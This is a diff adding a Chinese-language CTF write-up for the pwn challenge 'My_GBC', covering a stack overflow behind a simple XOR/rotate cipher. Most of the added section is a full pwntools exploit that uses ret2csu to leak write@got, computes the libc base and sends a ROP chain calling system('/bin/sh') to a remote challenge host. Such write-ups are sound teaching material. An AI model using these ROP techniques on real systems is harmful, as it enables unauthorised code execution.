@@ -140,3 +140,99 @@ p.interactive()
 才怪，输入`sh`可以直接获取`shell`
 ![[Pasted image 20241005222549.png]]
 接下来可以正常获取flag
+## My_GBC!!!!!
+![[Pasted image 20241006021055.png]]
+首先进行`gdb`调试，可以发现把我们的输入经由`encrypt`后存在栈上，可以栈溢出，所以可以将`payload`反向解密后注入，让其加密后成为我们实际输入的`payload`即可
+解决栈溢出的问题后，考虑如何进一步，初步看来以为是一个`ret2libc`，利用`write`函数泄露地址
+![[Pasted image 20241006021530.png]]
+但实际运行时发现我们无法获取`rdx`的`gadget`，便无法修改`write`的输出数量，实际运行也可以看出仅能输出一位
+![[Pasted image 20241006021707.png]]
+所以普通的`ret2libc`打不通。
+所以这里使用的是`ret2csu`，![[Pasted image 20241006021812.png]]
+即先调用`loc_4013A6`往`r12,r13,r14,r15`放入我们的值，然后调用`loc_401390`将`r14,r13,r12`的值分别存入`rdx,rsi,rdi`，再跳转到`r15`
+具体构造payload:
+```python
+payload = b'a' * 0x18
+payload += p64(csu_1)
+payload += p64(0) + p64(1)
+# r12 r13 r14 r15 -> rdi rsi rdx call
+payload += p64(1) + p64(leak_got) + p64(8) + p64(leak_got)
+payload += p64(csu_2) + b'a' * 0x38
+payload += p64(main)
+```
+完整exp:
+```python
+from pwn import *
+
+def ror1(byte, count):
+    return ((byte >> count) | (byte << (8 - count))) & 0xFF
+
+def decrypt(data, key, length):
+    decrypted_data = bytearray()
+    for i in range(length):
+        byte = data[i]
+        byte = ror1(byte, 3)  # 右循环移位3位
+        byte ^= key  # 异或操作
+        decrypted_data.append(byte)
+    return decrypted_data
+
+context.log_level = 'debug'
+local = True
+elf = ELF('./My_GBC')
+libc = ELF('./libc.so.6')
+if local:
+    p = process('./My_GBC')
+    pwnlib.gdb.attach(p, 'b *main')
+else:
+    p = remote('39.106.48.123', 32325)
+key = 0x5a
+
+ret = 0x40101a
+rdi = 0x4013b3
+rsi = 0x4013b1
+
+csu_1 = 0x4013Aa
+csu_2 = 0x401390
+
+write_plt = 0x401060
+leak_got = elf.got['write']
+main = elf.symbols['main']
+
+'''payload = b'a' * 0x18
+payload += p64(rdi) + p64(1)
+payload += p64(rsi) + p64(leak_got) + p64(8)
+payload += p64(write_plt) + p64(main)'''
+payload = b'a' * 0x18
+payload += p64(csu_1)
+payload += p64(0) + p64(1)
+# r12 r13 r14 r15 -> rdi rsi rdx call
+payload += p64(1) + p64(leak_got) + p64(8) + p64(leak_got)
+payload += p64(csu_2) + b'a' * 0x38
+payload += p64(main)
+
+payload = decrypt(payload, key, len(payload))
+
+# Send the payload
+p.sendline(payload)
+  
+p.recvuntil(b'Encrypted: ')
+p.recvuntil(b'\n')
+leaked_address = u64(p.recv(8))
+print(f'Leaked address: {hex(leaked_address)}')
+
+base = leaked_address - libc.symbols['write']
+print(f'Libc base: {hex(base)}')
+system = base + libc.symbols['system']
+bin_sh = base + next(libc.search(b'/bin/sh'))
+
+payload = b'a' * 0x18 + p64(ret)
+payload += p64(rdi)
+payload += p64(bin_sh)
+payload += p64(system)
+
+payload = decrypt(payload, key, len(payload))
+p.sendline(payload)
+p.interactive()
+```
+![[Pasted image 20241006022233.png]]
+运行后获取flag
